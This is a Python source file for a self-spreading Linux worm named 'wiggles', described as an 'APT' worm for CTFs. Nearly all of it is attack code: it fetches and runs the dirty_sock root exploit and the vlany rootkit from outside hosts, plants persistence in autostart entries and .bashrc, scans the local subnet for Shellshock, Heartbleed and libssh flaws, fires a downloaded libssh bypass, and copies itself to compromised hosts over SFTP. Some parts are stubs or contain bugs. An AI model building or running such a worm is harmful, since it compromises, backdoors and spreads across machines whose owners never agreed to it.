#!/usr/bin/env python3
"""
#****************************************************************#
#           Author(s)     - pyCity                               #
#           Date          - 2/27/2019                            #
#           Version       - 1.0                                  #
#                                                                #
#           Usage         - python3 wiggles.py                   #
#                                                                #
#           Goal          - 'APT' worm for dropping in CTFs      #
#                                                                #
#           Description   - Python network worm with persistence #
#                                                                #
#****************************************************************#
"""
# ----------------------------------------------------------------------------------------------------------------------
# IMPORTS

import os
import sys
import nmap
import netifaces
import pysftp
import ipaddress
import distro
import logging
import coloredlogs
import requests
import platform
import subprocess

from shutil import copyfile


# ----------------------------------------------------------------------------------------------------------------------
# ARTWORK

artwork = """                  
                                      .
                                   .OO
                                 .OOOO
                                .OOOO'
                                OOOO'          .-~~~~-.
                                OOO'          /   (o)(o)
                        .OOOOOO `O .OOOOOOO. /      .. |
                    .OOOOOOOOOOOO OOOOOOOOOO/\    \____/
                  .OOOOOOOOOOOOOOOOOOOOOOOO/ #\   ,\_/
                 .OOOOOOO%%OOOOOOOOOOOOO(#/\     /.
                .OOOOOO%%%OOOOOOOOOOOOOOO\ #\  \/OO.                                                           ___ 
               .OOOOO%%%%OOOOOOOOOOOOOOOOO\   \/OOOO.                                                         /~~ )
               OOOOO%%%%OOOOOOOOOOOOOOOOOOO\_\/\OOOOO           ____                                         /'o  |
               OOOOO%%%OOOOOOOOOOOOOOOOOOOOO\###)OOOO         .';;|;;\            _,-;;;\;-_               ,'  _/'|
               OOOOOO%%OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO        `\_/;;;/;\         /;;\;;;;\;;;,             |     .'
               OOOOOOO%OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO            `;/;;;|      ,;\;;;|;;;|;;;|;\          ,';;\  |
               `OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO'             |;;;/;:     |;;;\;/~~~~\;/;;;|        ,;;;;;;.'
             .-~~\OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO'             |;/;;;|     |;;;,'      `\;;/;|      /;\;;;;/
            / _/  `\(#\OOOOOOOOOOOOOOOOOOOOOOOOOOOO'               `|;;;/;\___/;~\;|         |;;;;;----\;;;|;;/'
           / / \  / `~~\OOOOOOOOOOOOOOOOOOOOOOOOOO'                 `;/;;;|;;;|;;;,'         |;;;;|;;;;;|;;|/'
          |/'  `\//  #\ \OOOOOOOOOOOOOOOOOOOOOOOO'                   `\;;;|;;;/;;,'           `\;/;;;;;;|/~'
          '      `-.__\_,\OOOOOOOOOOOOOOOOOOOOO'                       `\/;;/;;;/               `~------'
                     `OO\#)OOOOOOOOOOOOOOOOOOO'                          `~~~~~ 
                       `OOOOOOOOO''OOOOOOOOO'
                         `""""""'  `""""""'
  
WWWWWWWW                           WWWWWWWWIIIIIIIIII      GGGGGGGGGGGGG        GGGGGGGGGGGGGLLLLLLLLLLL             EEEEEEEEEEEEEEEEEEEEEE   SSSSSSSSSSSSSSS 
W::::::W                           W::::::WI::::::::I   GGG::::::::::::G     GGG::::::::::::GL:::::::::L             E::::::::::::::::::::E SS:::::::::::::::S
W::::::W                           W::::::WI::::::::I GG:::::::::::::::G   GG:::::::::::::::GL:::::::::L             E::::::::::::::::::::ES:::::SSSSSS::::::S
W::::::W                           W::::::WII::::::IIG:::::GGGGGGGG::::G  G:::::GGGGGGGG::::GLL:::::::LL             EE::::::EEEEEEEEE::::ES:::::S     SSSSSSS
 W:::::W           WWWWW           W:::::W   I::::I G:::::G       GGGGGG G:::::G       GGGGGG  L:::::L                 E:::::E       EEEEEES:::::S            
  W:::::W         W:::::W         W:::::W    I::::IG:::::G              G:::::G                L:::::L                 E:::::E             S:::::S            
   W:::::W       W:::::::W       W:::::W     I::::IG:::::G              G:::::G                L:::::L                 E::::::EEEEEEEEEE    S::::SSSS         
    W:::::W     W:::::::::W     W:::::W      I::::IG:::::G    GGGGGGGGGGG:::::G    GGGGGGGGGG  L:::::L                 E:::::::::::::::E     SS::::::SSSSS    
     W:::::W   W:::::W:::::W   W:::::W       I::::IG:::::G    G::::::::GG:::::G    G::::::::G  L:::::L                 E:::::::::::::::E       SSS::::::::SS  
      W:::::W W:::::W W:::::W W:::::W        I::::IG:::::G    GGGGG::::GG:::::G    GGGGG::::G  L:::::L                 E::::::EEEEEEEEEE          SSSSSS::::S 
       W:::::W:::::W   W:::::W:::::W         I::::IG:::::G        G::::GG:::::G        G::::G  L:::::L                 E:::::E                         S:::::S
        W:::::::::W     W:::::::::W          I::::I G:::::G       G::::G G:::::G       G::::G  L:::::L         LLLLLL  E:::::E       EEEEEE            S:::::S
         W:::::::W       W:::::::W         II::::::IIG:::::GGGGGGGG::::G  G:::::GGGGGGGG::::GLL:::::::LLLLLLLLL:::::LEE::::::EEEEEEEE:::::ESSSSSSS     S:::::S
          W:::::W         W:::::W          I::::::::I GG:::::::::::::::G   GG:::::::::::::::GL::::::::::::::::::::::LE::::::::::::::::::::ES::::::SSSSSS:::::S
           W:::W           W:::W           I::::::::I   GGG::::::GGG:::G     GGG::::::GGG:::GL::::::::::::::::::::::LE::::::::::::::::::::ES:::::::::::::::SS 
            WWW             WWW            IIIIIIIIII      GGGGGG   GGGG        GGGGGG   GGGGLLLLLLLLLLLLLLLLLLLLLLLLEEEEEEEEEEEEEEEEEEEEEE SSSSSSSSSSSSSSS   

"""

# ----------------------------------------------------------------------------------------------------------------------
# LOGGING

logger = logging.getLogger(__name__)
coloredlogs.install(level='DEBUG', logger=logger)

# ----------------------------------------------------------------------------------------------------------------------
# VARIABLES

nm = nmap.PortScanner()

private_key = "id_rsa"
public_key = "id_rsa.pub"

# ----------------------------------------------------------------------------------------------------------------------
# EXPLOIT SOURCES

urls = {
    "dirty_sockv2.py"      : "https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py",
    "vlany"                : "https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/"
                             "6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh",
    "libsshauthbypass.py"  : "https://raw.githubusercontent.com/blacknbunny/libSSH-Authentication-Bypass/master"
                             "/libsshauthbypass.py"
}
# TODO - Find common vulns that i can easily verify with nmap scripts

# ----------------------------------------------------------------------------------------------------------------------
# FUNCTIONS


def download_file(url, file):
    """Download file from url, save to disk. Return the file's full location"""
    logger.debug("Downloading {} from {}".format(file, url))
    with requests.get(url) as r:
        with open(file, "w") as f:
            f.write(r.text)
            logger.debug("Download successful: {}".format(f.name))
            return f.name


def get_file(host, user, private_key, remote_file, local_dir):
    """Download a file via SFTP from a remote host, return the file"""
    logger.debug("SFTPing {} from {}:{}".format(remote_file, user, host))
    with pysftp.Connection(host, user, private_key) as sftp:
        with sftp.chdir(local_dir):
            sftp.get(remote_file)
            return remote_file


def put_file(host, user, private_key, local_file, remote_dir):
    """Upload a file via SFTP from local host to remote_dir"""
    with pysftp.Connection(host, user, private_key) as sftp:
        with sftp.chdir(remote_dir):
            sftp.put(local_file)


def exec_code(host, user, private_key, payload):
    """Login to a server and execute remote code"""
    with pysftp.Connection(host, user, private_key) as sftp:
        if sftp.exists("/etc/.wiggles"):
            with sftp.cd("/etc/.wiggles"):
                sftp.execute(payload)
        else:
            sftp.mkdir("/etc/.wiggles")

# ----------------------------------------------------------------------------------------------------------------------
# CLASSES


class Agent:
    """
#*****************************************************************************************************#
#-------------------------------------------AGENT DATA------------------------------------------------#
#                                                                                                     #
# Class Goal: Install agent - Establish communication to C2 - Escalate privileges - Apply Persistence #
#                                                                                                     #
#       Methods:                                                                                      #
#                                                                                                     #
#   public_ip        - Make a quick web request to get the current host's public IP address           #
#                                                                                                     #
#   expand_path      - Convenience function to get the full path of a file (For readability)          #
#                                                                                                     #
#   get_privs        - Download and execute dirty sock exploit, return true on success                #
#                                                                                                     #
#   install_rootkit  - Download and execute Vlany LD_PRELOADED x86_x64 kernal rootkit                 #
#                    - Used to maintain root access and hide malicious actions                        #
#                                                                                                     #
#   persistence      - Backdoor user's .config/autostart > crontab > service > rc.local > .bashrc     #
#                    - Depending on what distro the host is running                                   #
#*****************************************************************************************************#
    """

    def __init__(self):
        self.username = "dirty_sock"
        self.password = "dirty_sock"
        self.ip = self.public_ip()    # Public IP address of Agent
        self.dist = distro.linux_distribution(full_distribution_name=False)  # Linux distribution for agent
        self.platform = platform.platform()  # Platform and uname info for agent
        self.uid = os.getuid()        # UID of agent (0 for root)

    @staticmethod
    def public_ip():
        """Get device's public IP address for communication with C2"""

        try:
            logger.debug("Looking up public IP")
            with requests.get("https://api.ipify.org") as ip:
                logger.debug("Public IP: {}".format(ip.text))
                return ip
        except requests.exceptions.ConnectionError as err:
            logger.error("Must have an internet connection to run.\n{}".format(err))
            exit(1)

    @staticmethod
    def expand_path(path):
        """Return the absolute path of the file passed in"""
        return os.path.expandvars(os.path.expanduser(path))

    def get_privs(self):
        """Check if host is vulnerable to dirty_sock, if so download and run Dirty_Sock exploit,
           return true on success"""

        url = urls.get("dirty_sockv2.py")
        file_name = url.split("/")[-1]

        logger.debug("Checking if host is vulnerable to dirty_sock")
        if subprocess.run("which snap", shell=True):
            logger.debug("Host is vulnerable! Downloading exploit")
            file_path = download_file(url, file_name)
            subprocess.run("chmod +x {0} && ./{0}".format(file_path), shell=True)
        else:
            logger.debug("Snap not available. Host not vulnerable to dirty_sock")

    def install_rootkit(self):
        """Download and install vlany rootkit on agent with superuser 'wiggles' """

        url = urls.get("vlany")
        file_name = url.split("/")[-1]

        logger.debug("Checking if host is vulnerable to vlany")
        if "x86_64" in self.platform:
            logger.debug("Agent is vulnerable!")
            file_path = download_file(url, file_name)
            subprocess.run("chmod +x {0} && ./{0}".format(file_path), shell=True)
            # TODO How can i automate the TUI installation from here? (PyAutoHotkey?)
        else:
            logger.debug("Host doesn't meet requirements for vlany")

    def persist(self):
        """Add payload to autostart > crontab > service > rc.local > .bashrc depending on distro"""

        # Backdoor /home/$USER/.config/autostart
        persist_dir = self.expand_path("/etc/.wiggles")
        if not os.path.exists(persist_dir):
            os.mkdir(persist_dir)

        worm_path = os.path.join(persist_dir, os.path.basename(sys.argv[0]))
        copyfile(worm_path, persist_dir)
        os.chmod(worm_path, 0o777)

        if self.expand_path("~/.config/autostart/"):
            payload = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Wiggles\nExec={}\n".format(worm_path)
            with open(self.expand_path("~/.config/autostart/wiggles.desktop"), "w") as f:
                f.write(payload)

        # TODO crontab, service/systemd, rc.local

        # Backdoor /home/$USER/.bashrc
        else:
            with open(self.expand_path("~/.bashrc"), "a") as f:
                f.write("\n(if [ $(ps aux|grep "+os.path.basename(sys.argv[0])+"|wc -l) -lt 2 ]; then "+worm_path+";fi&)\n")


class SideChain:
    """
#****************************************************************************************************#
#------------------------------------SIDECHAIN DATA--------------------------------------------------#
#                                                                                                    #
# Class Goal: Try several different exploits to spread Agent to other PCs on the same subnet         #
#                                                                                                    #
# Side Chaining is the process of compressing lower frequencies to synchronize them with higher      #
# frequencies in audio production. We name the class SideChain because we're syncing different       #
# exploits towards different flavours of Linux.                                                      #
#                                                                                                    #
#       Methods:                                                                                     #
#                                                                                                    #
#   private_ip       - Get the current host's private IP for finding the subnet                      #
#                                                                                                    #
#   get_subnet       - Using the private_ip, return the host's subnet (INCOMPLETE!)                  #
#                                                                                                    #
#   ping_subnet      - Ping sweep all hosts in current subnet                                        #
#                                                                                                    #
#   scan_sshock      - Scan hosts using nmap's http-shellshock script, return vulnerable hosts       #
#                                                                                                    #
#   exploit_sshock   - Fire sshock exploit at vulnerable hosts                                       #
#                                                                                                    #
#   scan_libssh      - Scan hosts for vulnerable SSH version                                         #
#                                                                                                    #
#   download_libssh  - Download libsshauthbypass from source, save to disk                           #
#                                                                                                    #
#   exploit_libssh   - Fire libsshbypass at vulnerable hosts                                         #
#                                                                                                    #
#   exec_code        - Download and execute wiggles.py to successfully exploited hosts               #
#                                                                                                    #
#****************************************************************************************************#
    """

    # After object is created, automatically finds the ip, subnet, live hosts and begins looking for vulnerabilities
    def __init__(self, agent):
        self.agent = agent
        self.ip = self.private_ip()
        self.subnet = self.get_subnet()
        self.live_hosts = self.ping_subnet()
        self.sshock_hosts = self.scan_shellshock()
        self.libssh_exploit = self.download_libssh()
        self.ssh_hosts = self.scan_libssh()

    @staticmethod
    def private_ip():
        """Get the machine's private IP address for discovering the subnet.
           Loop through each network interface (eth1, wlo1, etc) to find the
           current machine's internet connection, extract IP from there"""

        network_interfaces = netifaces.interfaces()
        for i in network_interfaces:
            address = netifaces.ifaddresses(i)[2][0]['addr']
            if address != "127.0.0.1" or "127.0.1.1":
                priv_ip = address
                logger.debug("Private IP: {}".format(priv_ip))
                return priv_ip

    @staticmethod
    def get_subnet():
        """ Using the private IP, generate the proper subnet"""

        subnet = ipaddress.ip_network("10.0.0.0/24")
        logger.debug("Subnet: {}".format(subnet))
        return subnet

    def ping_subnet(self):
        """Ping scan all hosts in the same network, return an array of all hosts"""

        nm.scan(str(self.subnet), arguments="-sn")

        # Create a tuple of alive hosts using a generator - outputs ("10.0.0.1", "up")
        live_hosts = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]

        # Generate a list of the first element (ip) of each tuple in live_hosts
        logger.debug("Available Hosts: {}\n".format([host[0] for host in live_hosts]))
        return live_hosts

    def scan_shellshock(self):
        """Scan for hosts vulnerable to ShellShock using nmap script"""

        vuln_hosts = []

        logger.debug("Scanning live hosts for ShellShock")
        for host in self.live_hosts: # Get the first element each host ("10.0.0.1", "up")
            results = nm.scan(host[0], ports="1-1024", arguments="--script=http-shellshock")
            if "VULNERABLE" in results:
                vuln_hosts.append(host[0])
        logger.debug("Hosts vulnerable to shellshock: {}\n".format(vuln_hosts))
        return vuln_hosts

    def scan_heartbleed(self):
        """Scan hosts for HeartBleed vulnerability"""

        vuln_hosts = []

        logger.debug("Scanning hosts for HeartBleed")
        for host in self.live_hosts:
            results = nm.scan(host[0], ports="80,443,445", arguments="-sV --script=ssl-heartbleed")
            if "VULNERABLE" in results:
                vuln_hosts.append(host[0])
        logger.debug("Hosts vulnerable to HeartBleed: {}\n".format(vuln_hosts))
        return vuln_hosts

    def scan_libssh(self):
        """Scan for hosts with port 22 open, return an array of hosts"""

        vuln_hosts = []

        logger.debug("Scanning for hosts with port 22 open")
        for host in self.live_hosts:
            nm.scan(host[0], ports="22", arguments="-sC")
            if host[1] == "up":
                vuln_hosts.append(host[0])
        logger.debug("Vulnerable hosts: {}".format(vuln_hosts))
        return vuln_hosts

    def download_libssh(self):
        """Download LibSSH Auth Bypass from exploit DB, save to disk"""

            url = urls.get("libsshauthbypass.py")
            file_name = url.split("/")[-1]
            local_file = download_file(url, file_name)
            subprocess.check_output(["python", local_file])
            return local_file

    def exploit_shellshock(self):
        """Exploit targets vulnerable to shellshock"""
        pass

    def exploit_libssh(self):
        """Exploit hosts with libssh_bypass"""

        infected_hosts = []

        logger.debug("Firing libsshbypass at vulnerable hosts")
        for host in self.ssh_hosts:
            try:
                output = subprocess.run("python {} --host {} >/dev/null 2>&1".format(self.libssh_exploit, host),
                                        shell=True, timeout=10)
                if output == 0:
                    logger.debug("{} may be vulnerable".format(host))
                    infected_hosts.append(host)
            except subprocess.CalledProcessError as err:
                logger.error(err)
            except subprocess.TimeoutExpired as err:
                logger.error(err)
        logger.debug("Targets exploited by libssh_bypass: {}\n".format(infected_hosts))
        return infected_hosts

    def exec_code(self, host, payload):
        """Login to a server and execute payload"""

        with pysftp.Connection(host=host, private_key=private_key) as sftp:
            if sftp.exists("/etc/.wiggles"):
                with sftp.cd("/etc/.wiggles"):
                    sftp.get(payload)
                    sftp.execute(payload)
            else:
                sftp.mkdir("/etc/.wiggles")


# ----------------------------------------------------------------------------------------------------------------------

def main():

    if "Linux" in platform.platform():
        agent_1 = Agent()

        # If we don't have root, attempt priv esc
        if agent_1.uid != 0:
            logger.debug("Not root. Escalating privileges.")
            if agent_1.dist == "Ubuntu" or "Debian":
                agent_1.get_privs()
                agent_1.install_rootkit()

            elif agent_1.dist == "Arch":
                pass
            elif agent_1.dist == "Fedora":
                pass

        # After priv esc and persistence, begin spreading
        worm_1 = SideChain(agent_1)

        # If we find any hosts with 22 open, try to exploit libssh
        if worm_1.ssh_hosts:
            worm_1.exploit_libssh()

        # Try to exploit shellshock if vulnerable hosts exist
        if worm_1.sshock_hosts:
            worm_1.exploit_shellshock()

    elif "Windows" in platform.platform():
        pass

    elif "OSX" in platform.platform():
        pass


if __name__ == "__main__":
    logger.debug(artwork)
    logger.fatal(["DO NOT RUN ME ON CAMPUS!" for i in range(10)])
    # main()
